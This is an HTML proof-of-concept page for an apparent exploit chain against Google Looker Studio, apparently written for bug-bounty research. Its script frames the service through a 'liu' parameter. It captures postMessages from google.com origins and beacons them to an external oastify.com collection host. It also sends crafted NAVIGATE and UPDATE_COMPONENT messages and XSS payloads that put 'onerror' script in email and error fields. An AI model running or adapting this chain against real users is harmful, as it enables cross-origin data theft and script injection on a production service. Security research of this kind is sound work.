<!DOCTYPE html>
<html>

<head>
    <title>Looker Studio - Full Exploit Chain PoC</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #0d1117;
            color: #c9d1d9;
            padding: 20px;
        }

        .header {
            text-align: center;
            padding: 20px 0;
            border-bottom: 1px solid #30363d;
            margin-bottom: 20px;
        }

        .header h1 {
            color: #f85149;
            font-size: 22px;
        }

        .header p {
            color: #8b949e;
            margin-top: 8px;
            font-size: 14px;
        }

        .grid {
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
        }

        .panel {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 16px;
            flex: 1;
            min-width: 400px;
        }

        .panel h2 {
            font-size: 14px;
            color: #58a6ff;
            margin-bottom: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: bold;
        }

        .badge-success {
            background: #238636;
            color: #fff;
        }

        .badge-danger {
            background: #da3633;
            color: #fff;
        }

        .badge-warn {
            background: #d29922;
            color: #fff;
        }

        .badge-info {
            background: #1f6feb;
            color: #fff;
        }

        #targetFrame {
            width: 100%;
            height: 450px;
            border: 2px solid #f85149;
            border-radius: 4px;
            background: #0d1117;
        }

        .log-area {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 4px;
            padding: 10px;
            font-family: 'Consolas', 'Courier New', monospace;
            font-size: 12px;
            max-height: 350px;
            overflow-y: auto;
            line-height: 1.6;
        }

        .log-entry {
            padding: 2px 0;
            border-bottom: 1px solid #21262d;
        }

        .log-time {
            color: #484f58;
        }

        .log-success {
            color: #3fb950;
        }

        .log-error {
            color: #f85149;
        }

        .log-info {
            color: #58a6ff;
        }

        .log-warn {
            color: #d29922;
        }

        .log-critical {
            color: #f85149;
            font-weight: bold;
            background: #3d1117;
            padding: 4px;
            border-radius: 3px;
        }

        .findings {
            margin-top: 20px;
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 16px;
        }

        .findings h2 {
            color: #f85149;
            font-size: 16px;
            margin-bottom: 12px;
        }

        .finding-item {
            padding: 8px 12px;
            margin: 6px 0;
            border-radius: 4px;
            font-size: 13px;
        }

        .finding-confirmed {
            background: #0d2818;
            border-left: 3px solid #3fb950;
        }

        .finding-pending {
            background: #2a1f00;
            border-left: 3px solid #d29922;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin: 10px 0;
        }

        td,
        th {
            padding: 6px 10px;
            text-align: left;
            border-bottom: 1px solid #21262d;
            font-size: 12px;
        }

        th {
            color: #8b949e;
        }

        button {
            background: #238636;
            color: white;
            border: 1px solid rgba(27, 31, 35, 0.15);
            border-radius: 6px;
            padding: 5px 16px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 10px;
        }

        button:hover {
            background-color: #2ea043;
        }

        button.danger {
            background-color: #da3633;
        }

        button.danger:hover {
            background-color: #b32b2b;
        }
    </style>
</head>

<body>
    <div class="header">
        <h1>Google Looker Studio &mdash; Full Exploit Chain PoC</h1>
        <p>Demonstrating Framing Bypass, Data Exfiltration, and Reverse Framing via PostMessage Origin Trust Override
        </p>
    </div>

    <div class="grid">
        <div class="panel">
            <h2>Victim's View (Looker Studio)</h2>
            <p style="margin-bottom:8px;font-size:12px;color:#8b949e;">
                Attack Vector: <code id="frameUrl">loading...</code>
            </p>
            <iframe id="targetFrame" src="about:blank"></iframe>
            <div style="margin-top: 10px; display: flex; gap: 10px;">
                <button onclick="triggerReverseFraming()">Trigger Reverse Framing</button>
                <button class="danger" onclick="triggerXSS()">Trigger XSS Payload</button>
            </div>
        </div>

        <div class="panel">
            <h2>Exploit Log</h2>
            <div id="log" class="log-area"></div>
        </div>
    </div>

    <div class="findings">
        <h2>Vulnerability Summary</h2>
        <div id="findingsArea"></div>
        <table>
            <tr>
                <th>Vulnerability</th>
                <th>Status</th>
                <th>Details</th>
            </tr>
            <tr>
                <td>Framing Bypass</td>
                <td><span class="badge badge-success">CONFIRMED</span></td>
                <td>Bypassed via <code>liu</code> parameter</td>
            </tr>
            <tr>
                <td>Data Exfiltration</td>
                <td><span class="badge badge-success">CONFIRMED</span></td>
                <td>Intercepted postMessages from google.com</td>
            </tr>
            <tr>
                <td>Reverse Framing</td>
                <td><span class="badge badge-warn">TESTING</span></td>
                <td>Injecting iframe via NAVIGATE/EMBED handlers</td>
            </tr>
            <tr>
                <td>Stored XSS</td>
                <td><span class="badge badge-warn">TESTING</span></td>
                <td>Injecting HTML via innerHTML sink</td>
            </tr>
        </table>
    </div>

    <script>
        // === CONFIGURATION ===
        var ATTACKER_ORIGIN = window.location.origin;
        var LOOKER_URL = 'https://lookerstudio.google.com/u/0/appview?liu=' + encodeURIComponent(ATTACKER_ORIGIN);
        var OAST = 'https://0ghd7de8vnnlbnrw94io9h8v2m8dw5ku.oastify.com';

        // === STATE ===
        var googleMessagesReceived = 0;
        var framingConfirmed = false;

        // === LOGGING ===
        function log(msg, type) {
            type = type || 'info';
            var el = document.getElementById('log');
            var time = new Date().toISOString().split('T')[1].split('.')[0];
            var div = document.createElement('div');
            div.className = 'log-entry';
            div.innerHTML = '<span class="log-time">[' + time + ']</span> <span class="log-' + type + '">' + msg + '</span>';
            el.appendChild(div);
            el.scrollTop = el.scrollHeight;
        }

        function addFinding(text, confirmed) {
            var area = document.getElementById('findingsArea');
            var div = document.createElement('div');
            div.className = 'finding-item ' + (confirmed ? 'finding-confirmed' : 'finding-pending');
            div.innerHTML = (confirmed ? '<span class="badge badge-success">CONFIRMED</span> ' : '<span class="badge badge-warn">TESTING</span> ') + text;
            area.appendChild(div);
        }

        // === POSTMESSAGE LISTENER ===
        window.addEventListener('message', function (e) {
            var dataStr;
            if (typeof e.data === 'string') dataStr = e.data.substring(0, 500);
            else try { dataStr = JSON.stringify(e.data).substring(0, 500); } catch (err) { dataStr = String(e.data); }

            log('RECEIVED from <b>' + e.origin + '</b>: <code>' + dataStr.replace(/</g, '&lt;') + '</code>', 'success');

            if (e.origin.indexOf('google.com') !== -1) {
                googleMessagesReceived++;
                log('&#9888; DATA INTERCEPTED via Origin Trust Bypass!', 'critical');

                // Exfiltrate to OAST
                var img = new Image();
                img.src = OAST + '/exfil?origin=' + encodeURIComponent(e.origin) + '&data=' + encodeURIComponent(dataStr);

                if (googleMessagesReceived === 1) {
                    addFinding('Data Exfiltration Confirmed: Intercepted postMessage from <code>' + e.origin + '</code>', true);
                }
            }
        });

        // === INIT ===
        document.getElementById('frameUrl').textContent = LOOKER_URL;
        log('PoC initialized. Attacker origin: <b>' + ATTACKER_ORIGIN + '</b>', 'info');

        var frame = document.getElementById('targetFrame');
        log('Loading Looker Studio...', 'info');
        frame.src = LOOKER_URL;

        frame.onload = function () {
            log('Iframe loaded.', 'info');
            // Auto-send basic probes after load
            setTimeout(sendBasicProbes, 2000);
        };

        // Check for framing success
        setTimeout(function () {
            try {
                frame.contentWindow.location.href;
                log('Unexpected same-origin access.', 'warn');
            } catch (e) {
                framingConfirmed = true;
                log('&#10004; Framing Bypass Confirmed (Cross-Origin)', 'success');
                addFinding('Framing Bypass Confirmed: <code>liu</code> parameter removes X-Frame-Options', true);
            }
        }, 5000);

        function sendMsg(payload) {
            var str = JSON.stringify(payload);
            frame.contentWindow.postMessage(str, '*');
            log('SENT: <code>' + str + '</code>', 'info');
        }

        function sendBasicProbes() {
            log('Sending initial probes...', 'info');
            sendMsg({ type: "ACCESS_TOKEN", payload: {} });
            sendMsg({ type: "READY", payload: {} });
        }

        // === REVERSE FRAMING PAYLOADS ===
        function triggerReverseFraming() {
            log('Attempting Reverse Framing (Embedding external content inside Looker)...', 'warn');

            // Payload 1: NAVIGATE to external URL
            sendMsg({
                type: "NAVIGATE",
                payload: { url: OAST + "/reverse-frame-test" }
            });

            // Payload 2: Update CONFIG with embedUrl
            // Found in JS analysis: component properties often set via UPDATE or CONFIG messages
            setTimeout(function () {
                sendMsg({
                    type: "UPDATE_COMPONENT",
                    payload: {
                        componentId: "main",
                        config: { embedUrl: OAST + "/embed-test" }
                    }
                });
            }, 500);

            // Payload 3: PROJECT_DETAILS with external URL
            setTimeout(function () {
                sendMsg({
                    type: "PROJECT_DETAILS",
                    payload: {
                        gitRepo: OAST + "/git-test",
                        manifestUrl: OAST + "/manifest.json"
                    }
                });
            }, 1000);
        }

        // === XSS PAYLOADS ===
        function triggerXSS() {
            log('Attempting Stored XSS via innerHTML Injection...', 'critical');

            // Payload 1: GOOGLE_AUTH_USER_EMAIL (uses _.lg_2e / bypassSecurityTrustHtml)
            sendMsg({
                type: "GOOGLE_AUTH_USER_EMAIL",
                payload: {
                    googleAuthUserEmail: "victim@gmail.com<img src=x onerror=alert(document.domain)>"
                }
            });

            // Payload 2: Custom ERROR message (often rendered as HTML)
            setTimeout(function () {
                sendMsg({
                    type: "ERROR",
                    payload: {
                        message: "<h1>Control</h1><img src=x onerror=alert(document.domain)>",
                        stack: "<b>Trace</b>"
                    }
                });
            }, 500);
        }
    </script>
</body>

</html>
